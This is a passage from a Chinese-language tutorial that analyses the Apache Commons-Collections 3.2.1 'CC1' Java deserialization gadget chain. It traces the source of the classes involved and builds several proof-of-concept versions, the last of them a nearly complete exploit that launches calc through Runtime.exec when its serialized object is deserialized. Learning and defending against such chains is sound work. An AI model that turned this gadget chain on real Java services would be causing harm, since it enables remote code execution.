<modelVersion>4.0.0</modelVersion>\n  <groupId>org.example</groupId>\n  <artifactId>CC1</artifactId>\n  <packaging>war</packaging>\n  <version>1.0-SNAPSHOT</version>\n  <name>CC1 Maven Webapp</name>\n  <url>http://maven.apache.org</url>\n  <dependencies>\n    <dependency>\n      <groupId>commons-collections</groupId>\n      <artifactId>commons-collections</artifactId>\n      <version>3.2.1</version>\n    </dependency>\n  </dependencies>\n  <build>\n    <finalName>CC1</finalName>\n  </build>\n</project>\n\n```\n\n然后点击代码中的一个同步maven配置就行\n\n![image-20250527200309494](../image/achieve/202411/java学习/image-20250527200309494.png)\n\n完成之后整个目录是这样的\n\n![image-20250528152744784](../image/achieve/202411/java学习/image-20250528152744784.png)\n\n\n\n## 0x03源码分析\n\n先放CC1链\n\n```java\n/*\n\tGadget chain:\n\t\tObjectInputStream.readObject()\n\t\t\tAnnotationInvocationHandler.readObject()\n\t\t\t\tMap(Proxy).entrySet()\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\n\t\t\t\t\t\tLazyMap.get()\n\t\t\t\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\tRequires:\n\t\tcommons-collections\n */\n```\n\n看不懂？我也看不懂！我们一步步往下看吧\n\n### InvokerTransformer#transform()\n\n cc1链中的出口是commons collections库中的transformer接口，这个接口里边有个transform方法。\n\n```\norg.apache.commons.collections.Transformer\n```\n\n我们看看这个接口\n\n![image-20250527210838149](../image/achieve/202411/java学习/image-20250527210838149.png)\n\n找一下实现了这个接口的类\n\n![image-20250527210851975](../image/achieve/202411/java学习/image-20250527210851975.png)\n\n通过查看继承层次结构图，我们找到了InvokerTransformer类(当然肯定不止这一个类),在第119行，InvokerTransformer类重写了transform方法，并且该类还接入了Serializable序列化接口。\n\n```java\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass();\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n                \n        } catch (NoSuchMethodException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n        } catch (IllegalAccessException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n        } catch (InvocationTargetException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n        }\n    }\n```\n\n我们先看构造方法方法\n\n```java\n    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        this.iMethodName = methodName;\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n```\n\n构造方法中接收一个方法名，所调用方法的参数类型，所调用方法的参数值，简单来说就是一个方法名，一个方法形参类型，一个方法传递参数值\n\n然后重写的tranform方法，解释一下\n\n```java\n    public Object transform(Object input) {//接收一个对象输入\n        \n        //检测输入\n        if (input == null) {\n            return null;\n        } else {\n            try {\n                //获取对象的原型类\n                Class cls = input.getClass();\n                \n                //获取该原型类的方法名\n                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);\n                \n                //invoke调用类的方法，传入操作对象和参数，并返回方法调用的利用值\n                return method.invoke(input, this.iArgs);\n            } catch (NoSuchMethodException var4) {\n                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n            } catch (IllegalAccessException var5) {\n                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n            } catch (InvocationTargetException ex) {\n                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n            }\n        }\n    }\n```\n\n这么明显可以看到出现了反射机制的利用，这里通过获取一个对象并利用反射去获取并调用其原型类的方法，这里就是我们的利用点了\n\n因此我们可以通过 InvokerTransformer类的 transform 方法中invoke调用 Runtime类getRuntime对象的exec实现 rce\n\n写个poc\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\npublic class poc {\n    public static void main(String[] args) {\n        Runtime runtime = Runtime.getRuntime();\n\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        invokerTransformer.transform(runtime);\n    }\n}\n```\n\n这里根据构造函数的三个参数依次填入就行\n\n效果如下\n\n![image-20250527211655338](../image/achieve/202411/java学习/image-20250527211655338.png)\n\n成功执行命令calc\n\n另外这里利用反射也是可以的\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\npublic class poc{\n    public static void main(String[] args) throws Exception {\n        Runtime rt = Runtime.getRuntime();\n\n        //反射获取InvokerTransformer\n        Class c = Class.forName(\"org.apache.commons.collections.functors.InvokerTransformer\");\n        Constructor ctor = c.getDeclaredConstructor(String.class, Class[].class,Object[].class);\n        InvokerTransformer invokerTransformer = (InvokerTransformer) ctor.newInstance(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"});\n        Method m = c.getDeclaredMethod(\"transform\", Object.class);\n        m.invoke(invokerTransformer, rt);\n\n    }\n}\n```\n\n由此我们就找到了链子的出口，接下来就是一步步回溯，寻找合适的子类，构造漏洞链，找到直接到达重写了readObject的类\n\n### TransformedMap#checkSetValue()\n\n我们继续查找一下调用tranform()方法的类\n\n![image-20250527212330617](../image/achieve/202411/java学习/image-20250527212330617.png)\n\n发现TransformedMap类的 checkSetValue() 里使用了 valueTransformer调用transform()\n\n![image-20250527212433286](../image/achieve/202411/java学习/image-20250527212433286.png)\n\n```java\nprotected Object checkSetValue(Object value) {\n        return valueTransformer.transform(value);\n    }\n```\n\n这里因为是protected受保护类型，只能内部类访问，权限不够，我们跟进valueTransformer看看\n\n![image-20250527212848243](../image/achieve/202411/java学习/image-20250527212848243.png)\n\n发现valueTransformer也是受保护类型的属性，但是这个参数是否可控呢？我们跟进一下这个参数的用法\n\n![image-20250527213915324](../image/achieve/202411/java学习/image-20250527213915324.png)\n\n发现在TransformedMap类中的decorate方法实例化了TransformedMap对象，并且在这么多方法中只有该方法是public公共属性的\n\n```java\n    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    }\n```\n\n所以猜想我们可以利用这个方法去实例化一个TransformedMap对象，从而传入想要的valueTransformer的值,也就是说，我们可以控制decorate()方法内的valueTransformer的值\n\n我们把这个类中需要用的方法都提出来\n\n```java\nprotected final Transformer valueTransformer;\n\n//构造方法\nprotected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    super(map);\n    this.keyTransformer = keyTransformer;\n    this.valueTransformer = valueTransformer;//valueTransformer在这里被赋值\n}\n\n//decorate方法\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\nreturn new TransformedMap(map, keyTransformer, valueTransformer);\n}\n\n//checkSetValue方法\nprotected Object checkSetValue(Object value) {\n    return valueTransformer.transform(value);\n}\n```\n\n类TransformedMap提供该decorate方法给外部进行TransformedMap构造,那我们给 valueTransformer 赋值 构造的InvokerTransformer实例 就可以通过 valueTransformer.transform(value)实现 InvokerTransformer.transform(value)从而 rce\n\n然后我们构造链子调用checkSetValue方法\n\n```java\nTransformedMap::decorate()->TransformedMap::checkSetValue()->InvokerTransformer::transform()\n```\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class poc {\n    public static void main(String[] args) throws Exception {\n        Runtime runtime = Runtime.getRuntime();\n\n        //反射获取InvokerTransformer\n        Class c = Class.forName(\"org.apache.commons.collections.functors.InvokerTransformer\");\n        Constructor constructor = c.getDeclaredConstructor(String.class, Class[].class, Object[].class);\n        InvokerTransformer invokerTransformer = (InvokerTransformer) constructor.newInstance(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"});\n\n        //调用decorate方法\n        Class c2 = Class.forName(\"org.apache.commons.collections.map.TransformedMap\");\n        HashMap<Object, Object> map = new HashMap<>();\n        Map<Object, Object> tm = TransformedMap.decorate(map, null, invokerTransformer);\n\n        Method m = c2.getDeclaredMethod(\"checkSetValue\", Object.class);\n        m.setAccessible(true);\n        m.invoke(tm, runtime);\n\n    }\n}\n```\n\n这里的话因为decorate是静态方法，可以直接类名＋方法名调用，因为这里的checkSetValue是受保护属性，所以需要set一下权限\n\n![image-20250607190849518](../image/achieve/202411/java学习/image-20250607190849518.png)\n\n接下来寻找checkSetValue()，发现有一个用法，跟进看一下\n\n### AbstractInputCheckedMapDecorator#setValue()\n\n![image-20250527224202314](../image/achieve/202411/java学习/image-20250527224202314.png)\n\n```java\npublic Object setValue(Object value) {\n    value = parent.checkSetValue(value);\n    return entry.setValue(value);\n}\n```\n\n发现只有父类 AbstractInputCheckedMapDecorator抽象类里的 MapEntry 的setValue() 调用了checkSetValue()，并且这里的setValue()方法是公共的，所以可以直接打poc，不过这里有个方法可以助力一下\n\n```java\n        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {\n            super(entry);\n            this.parent = parent;\n        }\n```\n\n 在MapEntry方法中，Entry代表的是Map中的一个键值对，而我们在MapEntry中我们可以看到有setValue方法，正常来说，只要遍历了被修饰过的map，就能走到MapEntry类，也就会调用MapEntry类的setValue方法\n\n然后我们发现MapEntry类其实是继承了AbstractMapEntryDecorator父类的，我们跟进一下这个AbstractMapEntryDecorator类\n\n![image-20250527225346966](../image/achieve/202411/java学习/image-20250527225346966.png)\n\nMapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()\n\n所以我们的poc\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class poc{\n    public static void main(String[] args) throws Exception {\n        Runtime rt = Runtime.getRuntime();\n\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"});\n\n        HashMap<Object ,Object> map = new HashMap<>();\n        Map<Object, Object> tm = TransformedMap.decorate(map, null, invokerTransformer);\n\n        map.put(\"key\",\"value\");\n\n        for(Map.Entry entry: tm.entrySet()) {\n            entry.setValue(rt);\n        }\n    }\n}\n```\n\n这里的话解释一个很重要的代码\n\n```java\nmap.put(\"key\",\"value\");\nfor(Map.Entry entry:tm.entrySet()) {\n    entry.setValue(rt);\n}\n```\n\n这里的话需要调试TransformedMap中没有entrySet方法，但是其继承的父类有\n\n![image-20250528164323886](../image/achieve/202411/java学习/image-20250528164323886.png)\n\n看到isSetValueChecking()返回true，那么会进入if语句，我们跟进new\n\n![image-20250528164716687](../image/achieve/202411/java学习/image-20250528164716687.png)\n\n用内部静态类的构造器EntrySet() 实例化EntrySet类，其中parent是对象TransformedMap\n\n当调用 `transformedMap.entrySet()` 时，返回的 `Entry` 对象并不是普通的 `HashMap.Entry`，而是 **`TransformedMap.MapEntry`**（`AbstractInputCheckedMapDecorator` 的内部类）。\n\n对于每个遍历到的键值对，都会进行setValue方法的调用 。在普通的Map中，这个方法通常用于修改值。但是在经过 TransformedMap装饰后，setValue方法的行为由装饰器定义，也就是说本来会调用的map类中的setValue的方法，但是我们使用的是TransformedMap，TransformedMap由于继承了AbstractInputCheckedMapDecorator类，而AbstractInputCheckedMapDecorator抽象类中的MapEntry类装饰了map类中的setValue的方法，所以我们实际调用的MapEntry中的setValue()方法（因为MapEntry类实际上是重写父类AbstractMapEntryDecorator的setValue()方法）\n\n![image-20250527231926985](../image/achieve/202411/java学习/image-20250527231926985.png)\n\n好好理解好好消化，这里我也想了很久\n\n![image-20250527232037276](../image/achieve/202411/java学习/image-20250527232037276.png)\n\n因为前面的东西很多，所以这里先做个总结\n\n```text\n为了找到可以触发InvokerTransformer::transform()方法的类方法，我们找到了TransformedMap::checkSetValue()方法，但是因为checkSetValue()方法中的valueTransformer是protected受保护属性，无法直接调用，所以我们想到了利用TransformedMap::decorate()方法去实例化对象从而控制valueTransformer的值，因为decorate()需要一个map实例，所以我们实例化了一个HashMap的map，并把这个map传入然后实例化了一个Map类型的transformedmap装饰器对象，之后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，但是由于MapEntry重写了setValue方法，而TransformedMap又继承了该父类，所以调用了MapEntry::setValue()方法，从而调用checkSetValue()方法\n```\n\n到此我们的链子就是\n\n```java\nMapEntry::setValue->TransformedMap::checkSetValue()->InvokerTransformer::transform()\n```\n\n### AnnotationInvocationHandler#readObject()\n\n然后我们继续往前走，寻找setValue方法\n\n```\nsun.reflect.annotation.AnnotationInvocationHandler\n```\n\n![image-20250527234003110](../image/achieve/202411/java学习/image-20250527234003110.png)\n\n看到readObject()方法了，看到那一刻我真的喜极而泣了，终于到源头了\n\n![image-20250527234157434](../image/achieve/202411/java学习/image-20250527234157434.png)\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type);\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name);\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n```\n\n我们找到这个类的构造函数\n\n```java\n    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {\n        Class<?>[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n        this.type = type;\n        this.memberValues = memberValues;\n    }\n```\n\n它接受两个参数，第一个参数是Class，它继承了Annotation，Annotation在java里是注解。即@Override，第二个参数是Map类型的，那我们可以把设计好的TransformedMap传进去\n\n这里一下子就很明朗了，memberValues可控，并且从readObject方法中发现该属性是一会要进行map遍历的，所以也就省去了我们之前自己做的遍历，那么我们就可以去实现`memberValue.setValue()`方法\n\n但是这里需要注意一个问题\n\n![image-20250527234618321](../image/achieve/202411/java学习/image-20250527234618321.png)\n\n这里可以发现，在定义该类的时候并没有说明是public公共类，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，需要用到**反射**来解决\n\n所以我们的链子是\n\n```\nAnnotationInvocationHandler::readObject()->MapEntry::setValue()->TransformedMap::checkSetValue()->InvokerTransformer::transform()\n```\n\n那我们动手写一下poc\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.Class;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class poc{\n    public static void main(String[] args) throws Exception {\n        Runtime rt = Runtime.getRuntime();\n\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"});\n\n        HashMap<Object ,Object> map = new HashMap<>();\n        Map<Object, Object> tm = TransformedMap.decorate(map, null, invokerTransformer);\n\n        map.put(\"key\",\"value\");\n\n        Class<?> c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor<?> constructor = c.getDeclaredConstructor(Class.class, Map.class);\n        constructor.setAccessible(true);\n        Object o = constructor.newInstance(Override.class, tm);\n        //System.out.println(o);\n        serialize(o);\n        unserialize(\"CC1.txt\");\n\n    }\n    public static void serialize(Object object)throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC1.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n        ois.close();\n    }\n}\n```\n\n但是这里并没有弹出是为什么呢？\n\n### CC1深入探讨\n\n#### Runtime序列化的问题\n\n**解决Runtime没有序列化的问题**\n\n在调试的过程中我发现了Runtime类并没有被序列化，这是为什么呢？我们进入这个类看一下\n\n![image-20250528000508415](../image/achieve/202411/java学习/image-20250528000508415.png)\n\n可以看到该类并没有接入序列化接口，所以可能导致了他无法被序列化，但是可以运用反射来获取它的原型类，它的原型类Class是存在serializable接口，可以序列化的\n\n然后也可以看到这里getRuntime()会返回currentRuntime，而currentRuntime就是一个新的Runtime()实例，所以我们可以利用反射去调用这个方法从而拿到一个Runtime()实例\n\n所以我们试着反射写一下\n\n```java\nimport java.lang.reflect.Method;\nimport java.lang.Class;\n\npublic class poc {\n    public static void main(String[] args) throws Exception {\n        //反射调用getRuntime方法\n        Class rc = Class.forName(\"java.lang.Runtime\");\n        Method getRuntime = rc.getDeclaredMethod(\"getRuntime\", null);\n        //利用getRuntime方法创建实例\n        Runtime rt = (Runtime) getRuntime.invoke(null, null);\n\n        //反射调用exec方法\n        Method exec = rc.getDeclaredMethod(\"exec\", String.class);\n        exec.invoke(rt,\"calc\");\n    }\n}\n```\n\n![image-20250528001520701](../image/achieve/202411/java学习/image-20250528001520701.png)\n\n基于这个原理，我们试着用transform()方法实现上述代码\n\n```java\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\nimport java.lang.Class;\nimport java.lang.reflect.Method;\n\npublic class poc{\n    public static void main(String[] args) throws Exception {\n//        //反射调用getRuntime方法\n//        Class rc = Class.forName(\"java.lang.Runtime\");\n//        Method getRuntime = rc.getDeclaredMethod(\"getRuntime\", null);\n//        //利用getRuntime方法创建实例\n//        Runtime rt = (Runtime) getRuntime.invoke(null, null);\n//\n//        //反射调用exec方法\n//        Method exec = rc.getDeclaredMethod(\"exec\", String.class);\n//        exec.invoke(rt,\"calc\");\n\n        //利用transform方法获取getRuntime的方法\n        Method getRuntime = (Method) new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class},new Object[] {\"getRuntime\",null}).transform(Runtime.class);\n\n        //利用transform方法获取invoke方法\n        Runtime runtime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class},new Object[]{null,null}).transform(getRuntime);\n\n        //利用transform方法获取exec方法执行calc命令\n        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime);\n    }\n}\n```\n\n我们看看这几条tranform通过反射获取方法的方法，但是这里如果参数多了的话就很麻烦，然后发现有一个ChainedTransformer 类正好可以干这个，我们看一下\n\n![image-20250528004556823](../image/achieve/202411/java学习/image-20250528004556823.png)\n\n我们看一下构造函数\n\n```java\n    public ChainedTransformer(Transformer[] transformers) {\n        super();\n        iTransformers = transformers;\n    }\n```\n\n所以需要传一个Transformer[]数组，那我们重新用ChainedTransformer实现一下\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\npublic class poc {\n    public static void main(String[] args) throws Exception {\n        Class runtime = Class.forName(\"java.lang.Runtime\");\n\n        Transformer[] Transformer = new Transformer[]{\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        chainedTransformer.transform(runtime);\n    }\n}\n```\n\n![image-20250528010957413](../image/achieve/202411/java学习/image-20250528010957413.png)\n\n然后修改poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class poc {\n    public static void main(String[] args) throws Exception {\n        Class runtime = Class.forName(\"java.lang.Runtime\");\n\n        Transformer[] Transformer = new Transformer[]{\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n\n        HashMap<Object,Object> map = new HashMap<>();\n        map.put(\"key\", \"value\");\n        Map<Object,Object> transformermap = TransformedMap.decorate(map,null,chainedTransformer);\n        \n        Class A = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructor = A.getDeclaredConstructor(Class.class, Map.class);\n        constructor.setAccessible(true);\n        Object object = constructor.newInstance(Override.class,transformermap);\n        serialize(object);\n        unserialize(\"CC1.txt\");\n\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC1.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n#### 关于两个if的问题\n\n**解决setValue()方法无法执行的原因**\n\n```java\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n```\n\n其实为什么这里没法执行，我们看完整代码\n\n![image-20250528120042814](../image/achieve/202411/java学习/image-20250528120042814.png)\n\n这里可以看到在setValue之前还有两层if语句，要想成功执行这个代码，我们就得满足两层if语句的条件\n\n本来想打断点调试的，但是不知道为啥， 我的idea一直跳不到readObject断点的地方，给infer师傅调他直接就跳了。。。估计是idea的问题，得重新装一个\n\n服了，装好后还是不行，只能看师傅的图了\n\n调试的时候发现memberType的值为空\n\n![在这里插入图片描述](../image/achieve/202411/java学习/655c36ca1eb61594dc27c7865924bb56.png)\n\n我们看看这个参数是怎么来的\n\n```java\nClass<?> memberType = memberTypes.get(name);\n```\n\n这里的话会调用memberTypes的get方法，参数为name，我们看看memberTypes是怎么来的\n\n```java\nMap<String, Class<?>> memberTypes = annotationType.memberTypes();\n```\n\nmemberTypes是通过annotationType调用memberTypes方法而来的，我们继续跟进\n\n```java\nAnnotationType annotationType = null;\nannotationType = AnnotationType.getInstance(type);\n```\n\n这里的话就是获取一个注解类型实例了，也就是我们的Overried\n\n然后在memberTypes中获取了注释里的值。\n\n![image-20250528161822043](../image/achieve/202411/java学习/image-20250528161822043.png)\n\n所以我们换一个有值的注解，那我们必须一个满足条件的有成员方法的Class，同时我们的Map里的key值还要改为这个成员方法名字。\n\n```java\nString name = memberValue.getKey();\nClass<?> memberType = memberTypes.get(name);\nif (memberType != null) {}\n```\n\n从这里可以看出其实memberValue是我们传入的map键值对，而name就是我们键值对中的key键\n\n而 Target里有 value方法。\n\n![image-20250528170723922](../image/achieve/202411/java学习/image-20250528170723922.png)\n\n所以这里我们修改Override.class为Target.class，然后更改Map中的Key为这个方法名value\n\n![image-20250528161654440](../image/achieve/202411/java学习/image-20250528161654440.png)\n\n然后底下那个if 判断 `if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))`，这里不用说肯定是满足的，能进来，所以我们的poc改成\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.Class;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class poc {\n    public static void main(String[] args) throws Exception {\n        Class runtime = Class.forName(\"java.lang.Runtime\");\n\n        Transformer[] Transformer = new Transformer[]{\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n\n        HashMap<Object,Object> map = new HashMap<>();\n        map.put(\"value\", \"value\");\n\n        Map<Object,Object> transformermap = TransformedMap.decorate(map,null,chainedTransformer);\n        Class A = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructor = A.getDeclaredConstructor(Class.class, Map.class);\n        constructor.setAccessible(true);\n        Object object = constructor.newInstance(Target.class,transformermap);\n        serialize(object);\n        unserialize(\"CC1.txt\");\n\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC1.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n现在能正常通过两个if语句了，但是我们可以看到这里的setValue中的参数是固定的无法修改，那这个问题该怎么解决呢？\n\n#### setValue里的value不可控的问题\n\n由于每次给setValue的值都被修改，这显然不符合我们的期望。于是查找transform()的实现方法，发现存在一个类ConstantTransformer\n\n![image-20250528171616473](../image/achieve/202411/java学习/image-20250528171616473.png)\n\n这里他会返回一个固定的值，我们看看构造方法\n\n```java\n    public ConstantTransformer(Object constantToReturn) {\n        super();\n        iConstant = constantToReturn;\n    }\n```\n\n可控且public，那么我们直接用这个吧\n\n```\nAnnotationInvocationHandler::readObject()->TransformedMap::setValue()->TransformedMap::checkSetValue()->chainedTransformer::transform()->InvokerTransformer::transform()\n```\n\n## 0x04最终的poc&&链子\n\n### 最终的POC1\n\n```java\npackage POC.CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception {\n\n        //实例化Runtime对象并调用exec方法执行命令\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\",new Class[]{String.class,Class[].class}, new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class}, new Object[]{null,null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        //Map类的构建和修饰\n        HashMap<Object,Object> map = new HashMap<>();\n        //满足readObject中Target注解的value方法\n        map.put(\"value\",\"aaa\");\n        Map<Object,Object> transformermap = TransformedMap.decorate(map,null,chainedTransformer);\n\n        //遍历map触发setValue方法\n        Class A = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructor = A.getDeclaredConstructor(Class.class, Map.class);\n        constructor.setAccessible(true);\n        Object o = constructor.newInstance(Target.class,transformermap);\n        serialize(o);\n        unserialize(\"CC1.txt\");\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC1.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        